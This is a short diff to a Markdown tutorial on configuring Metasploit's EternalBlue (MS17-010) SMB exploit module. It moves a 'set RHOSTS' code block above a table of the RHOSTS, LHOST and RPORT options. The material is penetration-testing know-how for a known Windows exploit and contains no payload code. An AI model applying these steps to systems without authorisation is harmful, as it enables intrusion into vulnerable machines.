@@ -44,6 +44,9 @@ use exploit/windows/smb/ms17_010_eternalblue
 
 Configure necessary parameters by employing the show options command to view and adjust settings as needed. Common options include `RHOSTS`,`LHOST`, `RPORT`, etc.
 
+```bash
+set RHOSTS <Target IP>
+```
 -------------------------------------------------------------------------------
 | Parameter | Description                           | Example Usage           |
 |-----------|---------------------------------------|-------------------------|
@@ -51,10 +54,6 @@ Configure necessary parameters by employing the show options command to view and
 | LHOST     | Local host listening IP for payloads  | `set LHOST 192.168.1.2` |
 | RPORT     | Remote port for the target service    | `set RPORT 445`         |
 -------------------------------------------------------------------------------
-
-```bash
-Set RHOSTS <Target IP>
-```
 
 ## 6. Set Payload
 
